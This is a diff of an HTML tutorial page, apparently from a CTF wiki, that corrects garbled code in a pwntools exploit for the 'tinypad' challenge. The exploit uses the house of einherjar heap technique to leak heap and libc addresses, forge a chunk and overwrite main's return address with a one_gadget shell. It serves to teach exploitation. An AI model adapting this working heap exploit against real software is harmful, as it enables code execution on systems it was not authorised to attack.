@@ -4774,7 +4774,6 @@
 
 <p>According to the truth, the size of the fake chunk is <code>0x221</code>, but why is <code>0x101</code>? This is because the validation of size and prev_size only happens in unlink, which is verified in unlink:</p>
 <div class="codehilite"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize</span><span class="p">(</span><span class="n">P</span><span class="p">)</span> <span class="o">!=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">next_chunk</span><span class="p">(</span><span class="n">P</span><span class="p">)),</span> <span class="mi">0</span><span class="p">))</span>      \
-
       <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;corrupted size vs. prev_size&quot;</span><span class="p">);</span>
 </pre></div>
 
@@ -4810,268 +4809,142 @@
 </ol>
 <p>Specific use of the script is as follows</p>
 <div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
 <span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;gnome-terminal&#39;</span><span class="p">,</span> <span class="s1">&#39;-x&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">]</span>
-
 <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
-
     <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
-
-<span class="n">tinypad</span> <span class="o">=</span> <span class="n">ELF</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="o">./</span> <span class="n">tinypad</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
+<span class="n">tinypad</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./tinypad&quot;</span><span class="p">)</span>
 <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
-
     <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
-
     <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
-
 <span class="k">else</span><span class="p">:</span>
-
     <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./tinypad&quot;</span><span class="p">)</span>
-
     <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
-
     <span class="n">main_arena_offset</span> <span class="o">=</span> <span class="mh">0x3c4b20</span>
-
 <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;PID: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
 
 
-
-
-
 <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(CMD)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(SIZE)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(CONTENT)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
-
-
-
 
 
 <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(CMD)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
-
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span> <span class="o">&amp;</span><span class="c1">#39;e&amp;#39;)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;e&#39;</span><span class="p">)</span>
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(INDEX)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(CONTENT)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Is it OK?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>
 
 
-
-
-
 <span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(CMD)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(INDEX)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
 
 
-
-
-
 <span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span>
-
         <span class="s1">&#39;  ============================================================================</span><span class="se">\n\n</span><span class="s1">&#39;</span>
-
     <span class="p">)</span>
-
     <span class="c1"># 1. leak heap base</span>
-
     <span class="n">add</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># idx 0</span>
-
     <span class="n">add</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># idx 1</span>
-
     <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># idx 2</span>
 
-
-
     <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># delete idx 1</span>
-
     <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># delete idx 0, idx 0 point to idx 1</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; # CONTENT: &#39;</span><span class="p">)</span>
-
     <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>  <span class="c1"># get pointer point to idx1</span>
-
-<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span> <span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">light</span> <span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="c1">#39;x00&amp;#39;)) - 0x80</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x80</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get heap base: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
 
-
-
     <span class="c1"># 2. leak libc base</span>
-
     <span class="c1"># this will trigger malloc_consolidate</span>
     <span class="c1"># first idx0 will go to unsorted bin</span>
-
     <span class="c1"># second idx1 will merge with idx0(unlink), and point to idx0</span>
-
     <span class="c1"># third idx1 will merge into top chunk</span>
-
     <span class="c1"># but cause unlink feture, the idx0&#39;s fd and bk won&#39;t change</span>
-
     <span class="c1"># so idx0 will leak the unsorted bin addr</span>
-
     <span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; # CONTENT: &#39;</span><span class="p">)</span>
-
     <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-
     <span class="n">unsorted_offset_arena</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">8</span>
-
-<span class="n">main_arena</span> <span class="o">=</span> <span class="n">u64</span> <span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span> <span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="c1">#39;x00&amp;#39;)) - unsorted_offset_arena</span>
+    <span class="n">main_arena</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">unsorted_offset_arena</span>
     <span class="n">libc_base</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="n">main_arena_offset</span>
-
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;main arena addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">main_arena</span><span class="p">))</span>
-
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc base addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
 
-
-
     <span class="c1"># 3. house of einherjar</span>
-
     <span class="n">add</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x18</span><span class="p">)</span>  <span class="c1"># idx 0</span>
-
     <span class="c1"># we would like trigger house of einherjar at idx 1</span>
-
     <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mh">0xf8</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x11</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># idx 1</span>
-
     <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span> <span class="o">*</span> <span class="mh">0xf8</span><span class="p">)</span>  <span class="c1"># idx 2</span>
-
     <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span> <span class="o">*</span> <span class="mh">0xf8</span><span class="p">)</span>  <span class="c1">#idx 3</span>
 
-
-
     <span class="c1"># create a fake chunk in tinypad&#39;s 0x100 buffer, offset 0x20</span>
-
     <span class="n">tinypad_addr</span> <span class="o">=</span> <span class="mh">0x602040</span>
-
     <span class="n">fakechunk_addr</span> <span class="o">=</span> <span class="n">tinypad_addr</span> <span class="o">+</span> <span class="mh">0x20</span>
-
-<span class="n">fakechunk_size</span> <span class="o">=</span> <span class="mh">0x101</span>
-<span class="n">fakechunk</span> <span class="o">=</span> <span class="n">p64</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span> <span class="p">(</span><span class="n">fakechunk_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span> <span class="p">(</span><span class="n">fakechunk_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span> <span class="p">(</span>
-<span class="n">fakechunk_addr</span><span class="p">)</span>
-<span class="n">edit</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="o">&amp;</span><span class="c1">#39;d&amp;#39; * 0x20 + fakechunk)</span>
-
+    <span class="n">fakechunk_size</span> <span class="o">=</span> <span class="mh">0x101</span>
+    <span class="n">fakechunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fakechunk_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fakechunk_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span>
+        <span class="n">fakechunk_addr</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">fakechunk</span><span class="p">)</span>
 
     <span class="c1"># overwrite idx 1&#39;s prev_size and</span>
-
     <span class="c1"># set minaddr of size to &#39;\x00&#39;</span>
-
     <span class="c1"># idx 0&#39;s chunk size is 0x20</span>
-
     <span class="n">diff</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x20</span> <span class="o">-</span> <span class="n">fakechunk_addr</span>
-
     <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;diff between idx1 and fakechunk: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">diff</span><span class="p">))</span>
-
     <span class="c1"># &#39;\0&#39; padding caused by strcpy</span>
-
     <span class="n">diff_strip</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">diff</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>
-
     <span class="n">number_of_zeros</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">diff</span><span class="p">))</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">diff_strip</span><span class="p">)</span>
-
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">number_of_zeros</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
-
         <span class="n">data</span> <span class="o">=</span> <span class="n">diff_strip</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x18</span> <span class="o">-</span> <span class="n">i</span><span class="p">,</span> <span class="s1">&#39;f&#39;</span><span class="p">)</span>
-
         <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
-
     <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Deleted.&#39;</span><span class="p">)</span>
 
-
-
     <span class="c1"># fix the fake chunk size, fd and bk</span>
-
     <span class="c1"># fd and bk must be unsorted bin</span>
-
     <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_arena</span> <span class="o">+</span> <span class="mi">88</span><span class="p">)</span> <span class="o">+</span>
-
          <span class="n">p64</span><span class="p">(</span><span class="n">main_arena</span> <span class="o">+</span> <span class="mi">88</span><span class="p">))</span>
-
-
 
     <span class="c1"># 3. overwrite malloc_hook with one_gadget</span>
 
-
-
     <span class="n">one_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x45216</span>
-
-<span class="n">environ_pointer</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span> <span class="p">[</span><span class="o">&amp;</span><span class="c1">#39;__ about&amp;#39;]</span>
+    <span class="n">environ_pointer</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__environ&#39;</span><span class="p">]</span>
     <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;one gadget addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">))</span>
-
     <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;environ pointer addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">environ_pointer</span><span class="p">))</span>
-
     <span class="c1">#fake_malloc_chunk = main_arena - 60 + 9</span>
-
     <span class="c1"># set memo[0].size = &#39;a&#39;*8,</span>
-
     <span class="c1"># set memo[0].content point to environ to leak environ addr</span>
-
     <span class="n">fake_pad</span> <span class="o">=</span> <span class="s1">&#39;f&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x100</span> <span class="o">-</span> <span class="mh">0x20</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span>
-
         <span class="n">environ_pointer</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602148</span><span class="p">)</span>
-
     <span class="c1"># get a fake chunk</span>
-
     <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span> <span class="o">-</span> <span class="mi">8</span><span class="p">,</span> <span class="n">fake_pad</span><span class="p">)</span>  <span class="c1"># idx 2</span>
-
     <span class="c1">#gdb.attach(p)</span>
 
-
-
     <span class="c1"># get environ addr</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; # CONTENT: &#39;</span><span class="p">)</span>
-
     <span class="n">environ_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
-
-<span class="n">approximately_addr</span> <span class="o">=</span> <span class="n">u64</span> <span class="p">(</span><span class="n">approximately_addr</span><span class="p">)</span>
+    <span class="n">environ_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">environ_addr</span><span class="p">)</span>
     <span class="n">main_ret_addr</span> <span class="o">=</span> <span class="n">environ_addr</span> <span class="o">-</span> <span class="mi">30</span> <span class="o">*</span> <span class="mi">8</span>
 
-
-
     <span class="c1"># set memo[0].content point to main_ret_addr</span>
-
     <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_ret_addr</span><span class="p">))</span>
-
     <span class="c1"># overwrite main_ret_addr with one_gadget addr</span>
-
     <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">))</span>
-
     <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
 
-
-
-
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
-
     <span class="n">run</span><span class="p">()</span>
 </pre></div>
 
